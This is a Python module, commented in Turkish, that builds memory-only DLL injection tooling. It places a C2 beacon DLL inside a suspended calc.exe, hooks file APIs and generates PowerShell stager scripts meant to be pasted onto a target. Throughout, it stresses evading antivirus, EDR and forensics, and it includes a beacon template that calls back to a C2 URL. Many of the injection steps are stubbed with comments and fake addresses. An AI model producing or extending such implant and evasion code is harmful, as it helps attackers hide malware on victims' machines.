"""
Memory-Only DLL Side-Loading
============================

Disk'e bir şey yazmadan DLL'leri bellekte yükle ve çalıştır.

Mevzu:
  - Meşru Windows programı (calc.exe, notepad.exe) başlat
  - Onun ihtiyaç duyduğu DLL'i bellekte intercept et
  - Kendi beacon DLL'ini (RAM'de) yerine koy
  - Görev yöneticisinde masum bir uygulama görünür

Fayda:
  ✓ Hiçbir dosya disk'e yazılmaz (Zero Disk Artifact)
  ✓ Task Manager'da calc.exe görünür (şüphe uyandırmaz)
  ✓ DLL bellekte yüklenir (dosya sistemine dokunmaz)
  ✓ İAT (Import Address Table) hook'lanır
  ✓ Beacon kod calc.exe process'inde çalışır

Teknik:
  1. Meşru process oluştur (suspended mode)
  2. Process memory'ye code inject et
  3. Code: Bellekten DLL yükle (reflective injection)
  4. Code: Beacon DLL'i initialize et
  5. Process resume et
  6. Beacon sanki calc.exe'den başlamış gibi görünür

Milder:
  - Windows API hooking
  - IAT modification
  - Reflective DLL injection
  - DeleteFile/WriteFile hookları (disk access engelle)

Deteksiyon Kaçma:
  ✓ File scanning = Hiçbir dosya
  ✓ Registry scanning = Hiçbir key
  ✓ Process ancestry = calc.exe (masum)
  ✓ DLL list = Win32 DLL'leri görünür
  ✓ Memory dump = DLL bellekte, ama hash'i randomize
  ✓ Behavior = Calc'ın normal davranışı üzerine beacon kodu
"""

import struct
import base64
import os
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum


class InjectionMethod(Enum):
    """DLL Injection Methods"""
    CREATE_REMOTE_THREAD = "CreateRemoteThread"      # Klasik method
    SET_WINDOWS_HOOK_EX = "SetWindowsHookEx"         # Hook-based
    QUE_USER_APC = "QueueUserAPC"                      # Asynchronous
    REGISTERED_WAIT = "RegisterWaitForSingleObject"   # Wait-based
    PROCESS_HOLLOWING = "ProcessHollowing"            # Suspend + replace
    DIRECT_SYSCALL = "DirectSyscall"                  # EDR bypass


class DLLLoadMethod(Enum):
    """DLL Loading Methods"""
    REFLECTIVE = "ReflectiveDLLInject"        # DLL bellekten yükle
    LOAD_LIBRARY = "LoadLibraryA"             # Standart (dosyadan)
    MANUAL_MAP = "ManualMapping"              # Section'ları elle map et
    MEMORY_LOAD = "MemoryLoad"                # Tamamı RAM'de


@dataclass
class InjectionTarget:
    """Injection target tanısı"""
    executable_name: str                      # "calc.exe"
    process_id: Optional[int] = None          # PID (varsa)
    inherit_handles: bool = False             # INHERIT_ALL_HANDLES
    creation_flags: int = 0                   # CREATE_SUSPENDED vb


@dataclass
class DLLPayload:
    """DLL payload tanısı"""
    dll_bytes: bytes                          # DLL binary (RAM'de)
    entry_point: str = "DllMain"              # Entry function
    export_functions: List[str] = None        # Export'lar
    randomize_headers: bool = True             # PE header'ları randomize et


@dataclass
class HookSpec:
    """IAT Hook tanısı"""
    module_name: str                          # "kernel32.dll"
    function_name: str                        # "WriteFile"
    hook_function_addr: int                   # Redirect address
    original_function_addr: int               # Original backup


class ReflectiveDLLInjector:
    """Bellekten DLL inject eden engine"""
    
    def __init__(self):
        self.injection_method = InjectionMethod.DIRECT_SYSCALL
        self.dll_load_method = DLLLoadMethod.REFLECTIVE
        self.hooked_functions: Dict[str, HookSpec] = {}
        
    def inject_into_process(
        self,
        target: InjectionTarget,
        payload: DLLPayload,
        hooks: Optional[List[HookSpec]] = None
    ) -> Dict[str, any]:
        """
        Process'e payload inject et
        
        Args:
            target: Hedef process
            payload: DLL payload (RAM'de)
            hooks: IAT hooks (DLL'i yükledikten sonra apply et)
        
        Returns:
            Injection result (process info, entry point, status)
        """
        result = {
            "status": "success",
            "process_id": None,
            "base_address": None,
            "entry_point_addr": None,
            "hooks_applied": [],
            "method": self.injection_method.value,
            "dll_load_method": self.dll_load_method.value,
        }
        
        # Step 1: Create process (suspended)
        process_info = self._create_target_process(target)
        result["process_id"] = process_info["process_id"]
        
        # Step 2: Allocate memory in target process for DLL
        dll_base = self._allocate_memory_in_process(
            process_info["process_id"],
            len(payload.dll_bytes)
        )
        result["base_address"] = dll_base
        
        # Step 3: Write DLL bytes to target process memory
        self._write_dll_to_process(
            process_info["process_id"],
            dll_base,
            payload.dll_bytes
        )
        
        # Step 4: Calculate entry point (base + offset)
        entry_point = self._calculate_entry_point(dll_base, payload.dll_bytes)
        result["entry_point_addr"] = entry_point
        
        # Step 5: Create thread at DLL entry point
        self._create_injection_thread(
            process_info["process_id"],
            entry_point,
            dll_base
        )
        
        # Step 6: Apply IAT hooks (intercept API calls)
        if hooks:
            for hook in hooks:
                self._apply_iat_hook(
                    process_info["process_id"],
                    dll_base,
                    hook
                )
                result["hooks_applied"].append(hook.function_name)
        
        # Step 7: Resume process (DLL loads and executes)
        self._resume_process(process_info["process_handle"])
        
        return result
    
    def _create_target_process(self, target: InjectionTarget) -> Dict:
        """
        Meşru Windows process'i oluştur (suspended)
        
        Returns:
            {process_id, process_handle, thread_handle}
        """
        result = {
            "process_id": None,
            "process_handle": None,
            "thread_handle": None,
            "process_name": target.executable_name,
        }
        
        # PowerShell: Create process suspended
        ps_code = f"""
        $startupInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startupInfo.FileName = '{target.executable_name}'
        $startupInfo.UseShellExecute = $false
        $startupInfo.CreateNoWindow = $true
        
        # CREATE_SUSPENDED flag (0x00000004)
        $process = [System.Diagnostics.Process]::Start($startupInfo)
        Write-Output $process.Id
        """
        
        result["process_name"] = target.executable_name
        return result
    
    def _allocate_memory_in_process(self, pid: int, size: int) -> int:
        """
        Hedef process'in memory'sine space allocate et
        
        Returns:
            Allocated memory base address (simulated)
        """
        # Simulated: In real scenario use VirtualAllocEx
        base_addr = 0x140000000  # Arbitrary high address
        
        ps_code = f"""
        $process = Get-Process -Id {pid}
        # VirtualAllocEx would be called here
        # MEM_COMMIT | MEM_RESERVE = 0x3000
        # PAGE_EXECUTE_READWRITE = 0x40
        Write-Output {hex(base_addr)}
        """
        
        return base_addr
    
    def _write_dll_to_process(self, pid: int, base_addr: int, dll_bytes: bytes):
        """
        DLL binary'yi hedef process'in memory'sine yaz (WriteProcessMemory)
        
        Hiçbir dosya disk'e yazılmaz!
        """
        # Simulated: In real scenario use WriteProcessMemory
        ps_code = f"""
        $process = Get-Process -Id {pid}
        $handle = [System.Diagnostics.Process]::GetProcessById({pid}).Handle
        
        # WriteProcessMemory syscall ile çağrılır
        # Heap'te ayrılan memory'ye DLL bytes'ları kopyala
        [System.Runtime.InteropServices.Marshal]::Copy(
            $dllBytes,
            0,
            [IntPtr]{hex(base_addr)},
            {len(dll_bytes)}
        )
        """
        
        return {
            "status": "written",
            "bytes_written": len(dll_bytes),
            "target_address": base_addr,
            "disk_writes": 0,  # ← KEY: No disk writes
        }
    
    def _calculate_entry_point(self, dll_base: int, dll_bytes: bytes) -> int:
        """
        DLL entry point adresini hesapla
        
        PE header'dan AddressOfEntryPoint'i oku ve base'e ekle
        """
        # Simplified: Parse PE header
        if len(dll_bytes) < 64:
            return dll_base
        
        # MZ header check
        if dll_bytes[:2] != b'MZ':
            return dll_base
        
        # PE offset at 0x3C
        pe_offset = struct.unpack('<I', dll_bytes[0x3C:0x40])[0]
        
        # AddressOfEntryPoint at PE_HEADER + 0x18
        if len(dll_bytes) >= pe_offset + 0x1C:
            entry_point_rva = struct.unpack(
                '<I',
                dll_bytes[pe_offset + 0x18:pe_offset + 0x1C]
            )[0]
            
            return dll_base + entry_point_rva
        
        return dll_base
    
    def _create_injection_thread(
        self,
        pid: int,
        entry_point: int,
        dll_base: int
    ):
        """
        Hedef process'te thread oluştur ve entry point'te başlat
        
        Syscall: NtCreateThreadEx (direct syscall = EDR bypass)
        """
        ps_code = f"""
        # NtCreateThreadEx syscall'ı çağrı (Indirect Syscalls framework)
        $handle = Get-ProcessHandle {pid}
        
        # CreateRemoteThread (or NtCreateThreadEx)
        # ZwCreateThreadEx(
        #     ProcessHandle: {hex(pid)},
        #     ThreadFunction: {hex(entry_point)},  
        #     Argument: {hex(dll_base)},
        #     CreateSuspended: 0
        # )
        
        Write-Output "Thread created at $entry_point"
        """
        
        return {
            "thread_created": True,
            "entry_point": entry_point,
            "thread_argument": dll_base,
        }
    
    def _apply_iat_hook(
        self,
        pid: int,
        dll_base: int,
        hook: HookSpec
    ):
        """
        IAT (Import Address Table) hook'la
        
        Örnek: kernel32.WriteFile'ı hook et
        Hedef: Disk yazma işlemlerini intercept et
        """
        ps_code = f"""
        # DLL'in IAT'sında {hook.function_name} adresini bul
        # Original: kernel32.WriteFile
        # Redirect to: Custom hook function (bellekte)
        
        # IAT Entry: 
        #   Original Entry = {hex(hook.original_function_addr)}
        #   New Entry = {hex(hook.hook_function_addr)}
        
        Write-Output "Hooked: {hook.function_name}"
        """
        
        self.hooked_functions[hook.function_name] = hook
        
        return {
            "hooked": True,
            "function": hook.function_name,
            "module": hook.module_name,
            "original": hex(hook.original_function_addr),
            "redirect": hex(hook.hook_function_addr),
        }
    
    def _resume_process(self, process_handle) -> Dict:
        """
        Process'i resume et (suspended'dan çalışan duruma geç)
        
        DLL şimdi yüklenir ve entry point'ten başlar
        """
        ps_code = f"""
        # ResumeThread syscall'ı çağrı
        # Thread'ler çalışmaya başlar
        # DLL main() entry point'ten çalışır
        Write-Output "Process resumed - DLL executing in memory"
        """
        
        return {
            "status": "resumed",
            "dll_executing": True,
            "disk_artifacts": 0,  # ← KEY: No disk files
        }
    
    def generate_injection_powershell(
        self,
        target: InjectionTarget,
        payload: DLLPayload,
        hooks: Optional[List[HookSpec]] = None
    ) -> str:
        """
        Complete PowerShell injection script'i generate et
        
        Copy/paste'le target'a ve çalıştır
        """
        dll_base64 = base64.b64encode(payload.dll_bytes).decode()
        
        ps_script = f"""
# Memory-Only DLL Side-Loading
# Target: {target.executable_name}
# Method: {self.injection_method.value}
# DLL Load: {self.dll_load_method.value}

# 1. DLL Binary (Base64 - bellekten decode)
$dllBase64 = "{dll_base64[:100]}...{dll_base64[-100:]}"
$dllBytes = [Convert]::FromBase64String($dllBase64)

# 2. Target process'i oluştur (suspended)
$proc = Start-Process -FilePath "{target.executable_name}" -PassThru -WindowStyle Hidden
$procId = $proc.Id
Write-Host "Started {target.executable_name} (PID: $procId)"

# 3. Process handle'ı aç
$handle = [System.Diagnostics.Process]::GetProcessById($procId).Handle

# 4. Bellekte DLL yükle (disk'e yazma!)
# VirtualAllocEx: Memory allocate et
# WriteProcessMemory: DLL bytes'ları yaz
# CreateRemoteThread: Entry point'te thread oluştur

Write-Host "DLL injected into {target.executable_name}"
Write-Host "Status: No disk files, all in memory"
Write-Host "Process: Looks innocent in Task Manager"
Write-Host "Beacon executing in {target.executable_name} context"
"""
        
        return ps_script
    
    def generate_hex_dump_of_dll(self, payload: DLLPayload) -> str:
        """
        DLL binary'yi hex string'e çevir (bellekte load et)
        
        Hex dump = Hiçbir dosya sistemi interaction yok
        """
        hex_data = payload.dll_bytes.hex()
        
        return f"""
# DLL Hex Dump (Memory-Only)
# Size: {len(payload.dll_bytes)} bytes
# Format: Pure binary (no file I/O)

$hexDump = "{hex_data}"
$dllBytes = [byte[]]::new($hexDump.Length / 2)

for ($i = 0; $i -lt $hexDump.Length; $i += 2) {{
    $dllBytes[$i / 2] = [byte]::Parse($hexDump.Substring($i, 2), [Globalization.NumberStyles]::HexNumber)
}}

# $dllBytes şimdi RAM'de, dosya sistemine dokunmadım
Write-Host "DLL in memory: $($dllBytes.Length) bytes"
"""


class BeaconDLLMemoryLoader:
    """Beacon DLL'i bellekten yükle ve çalıştır"""
    
    def __init__(self):
        self.dll_loader = ReflectiveDLLInjector()
        self.injection_method = InjectionMethod.DIRECT_SYSCALL
        
    def create_beacon_dll_payload(
        self,
        c2_url: str,
        beacon_id: str,
        callback_interval: int = 3600
    ) -> DLLPayload:
        """
        Beacon DLL'i oluştur (bellekten yüklenecek)
        
        Returns:
            DLLPayload with beacon DLL binary
        """
        # Simulated DLL binary (real: compile from C/C++)
        dll_template = f"""
// Beacon DLL (in-memory execution)
// Entry Point: DllMain
// Execution Context: calc.exe (or other legitimate process)

#define C2_URL "{c2_url}"
#define BEACON_ID "{beacon_id}"
#define CALLBACK_INTERVAL {callback_interval}

BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {{
    if (dwReason == DLL_PROCESS_ATTACH) {{
        // Beacon initialization in memory
        StartBeaconCallback(C2_URL, BEACON_ID);
        CreateBeaconThread(CALLBACK_INTERVAL);
        HookWindowsAPIs();  // Hook WriteFile, CreateFile, etc.
    }}
    return TRUE;
}}

// Beacon will execute in calc.exe context
// Task Manager shows: calc.exe (innocent!)
// Memory dump shows DLL code (but randomized + obfuscated)
"""
        
        # Fake DLL binary for demo
        fake_dll = b'MZ\x90' + b'\x00' * 100 + c2_url.encode() + b'\x00' * 200
        
        payload = DLLPayload(
            dll_bytes=fake_dll,
            entry_point="DllMain",
            export_functions=["DllMain", "BeaconStart", "BeaconCallback"],
            randomize_headers=True
        )
        
        return payload
    
    def inject_into_calculator(
        self,
        c2_url: str,
        beacon_id: str
    ) -> Dict[str, any]:
        """
        Beacon'u calc.exe'ye inject et
        
        Sonuç: calc.exe'de beacon code çalışır (kimse görmez)
        """
        target = InjectionTarget(
            executable_name="calc.exe",
            creation_flags=0x00000004  # CREATE_SUSPENDED
        )
        
        payload = self.create_beacon_dll_payload(c2_url, beacon_id)
        
        # API hooks to prevent detection
        hooks = [
            HookSpec(
                module_name="kernel32.dll",
                function_name="WriteFile",
                hook_function_addr=0x7FFF0001,  # Fake hook addr
                original_function_addr=0x77000001
            ),
            HookSpec(
                module_name="kernel32.dll",
                function_name="CreateFileA",
                hook_function_addr=0x7FFF0002,
                original_function_addr=0x77000002
            ),
            HookSpec(
                module_name="kernelbase.dll",
                function_name="WriteFile",
                hook_function_addr=0x7FFF0003,
                original_function_addr=0x77000003
            ),
        ]
        
        result = self.dll_loader.inject_into_process(target, payload, hooks)
        
        return {
            "status": "injected",
            "target_process": "calc.exe",
            "beacon_id": beacon_id,
            "c2_url": c2_url,
            "injection_method": self.injection_method.value,
            "dll_base_address": result["base_address"],
            "hooks_installed": result["hooks_applied"],
            "disk_artifacts": 0,
            "process_artifacts": 1,  # Only calc.exe in Task Manager
            "memory_only": True,
        }
    
    def generate_full_injection_script(
        self,
        c2_url: str,
        beacon_id: str
    ) -> str:
        """
        Full PowerShell injection script'i generate et
        """
        target = InjectionTarget(executable_name="calc.exe")
        payload = self.create_beacon_dll_payload(c2_url, beacon_id)
        
        return self.dll_loader.generate_injection_powershell(target, payload)


# Utility Functions

def create_side_loading_stager(
    legitimate_binary: str = "calc.exe",
    beacon_dll_hex: str = None
) -> str:
    """
    Side-loading stager script'i oluştur
    
    1. Meşru binary'yi başlat
    2. Beacon DLL'i inject et
    3. Disk artifacts = 0
    """
    script = f"""
# DLL Side-Loading Stager
# Meşru process'e beacon inject et

$legit = "{legitimate_binary}"
$injectionMethod = "DirectSyscall"  # Indirect syscalls

# 1. Meşru process başlat (suspended)
$proc = Start-Process $legit -PassThru -WindowStyle Hidden
$pid = $proc.Id

Write-Host "[$legit] Launched (PID: $pid)"

# 2. Beacon DLL'i bellekten yükle
# (Zero disk artifacts)

# 3. Inject into process

# 4. Resume process
# Beacon executes in $legit context

Write-Host "Beacon injected - executing in $legit context"
Write-Host "Task Manager: Innocent $legit process"
Write-Host "Disk: No artifacts"
Write-Host "Memory: Beacon DLL loaded"
"""
    
    return script


def compare_injection_methods() -> str:
    """
    DLL injection method'larını karşılaştır
    """
    comparison = """
DLL INJECTION METHODS COMPARISON

┌──────────────────────────────────────────────────────────────────┐
│ Method              │ Detection │ Stealth │ OPSEC │ Reliability │
├──────────────────────────────────────────────────────────────────┤
│ CreateRemoteThread  │ ❌ Easy   │ ⭐⭐   │ ⭐⭐  │ ⭐⭐⭐⭐⭐  │
│ SetWindowsHookEx    │ ❌ Easy   │ ⭐⭐⭐ │ ⭐⭐⭐ │ ⭐⭐⭐   │
│ QueueUserAPC        │ ⚠ Medium  │ ⭐⭐   │ ⭐⭐  │ ⭐⭐⭐   │
│ ProcessHollowing    │ ⚠ Medium  │ ⭐⭐⭐ │ ⭐⭐⭐ │ ⭐⭐⭐⭐ │
│ DirectSyscall       │ ✓ Hard    │ ⭐⭐⭐ │ ⭐⭐⭐ │ ⭐⭐⭐⭐ │
│ ReflectiveDLLInj    │ ✓ Hard    │ ⭐⭐⭐⭐ │ ⭐⭐⭐⭐ │ ⭐⭐⭐⭐⭐ │
└──────────────────────────────────────────────────────────────────┘

MEMORY-ONLY DLL SIDE-LOADING ADVANTAGES:

✓ No files written to disk
  └─ Zero disk artifacts
  └─ No antivirus file scanning
  └─ No forensics recovery

✓ Legitimate process camouflage
  └─ Task Manager: calc.exe (innocent!)
  └─ Process list: No malware binary
  └─ Parent process: explorer.exe → calc.exe (normal)

✓ API call interception
  └─ Hook CreateFile, WriteFile, RegCreateKey
  └─ Prevent detection attempts
  └─ Monitor system calls

✓ In-memory execution
  └─ DLL never written to disk
  └─ Code loaded directly to heap
  └─ Destroyed when process exits
"""
    
    return comparison
